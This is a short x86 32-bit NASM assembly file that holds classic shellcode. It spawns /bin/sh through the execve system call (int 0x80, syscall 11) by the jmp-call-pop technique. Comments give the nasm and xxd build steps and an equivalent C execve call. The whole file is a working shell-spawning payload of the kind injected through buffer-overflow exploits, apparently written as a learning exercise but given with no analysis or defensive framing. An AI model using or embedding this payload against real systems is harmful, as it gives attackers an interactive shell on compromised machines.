BITS 32
jmp short sec
fir:
xor edx, edx
pop ebx
push edx
push ebx
mov ecx, esp
xor eax, eax
mov al, 11
int 0x80
sec:
call near fir
db "/bin/sh"


; nasm tes.s 
; xxd tes

; char s[] = "/bin/sh";
; char* ss[2] = {s,0};
;	execve(s,ss,0);

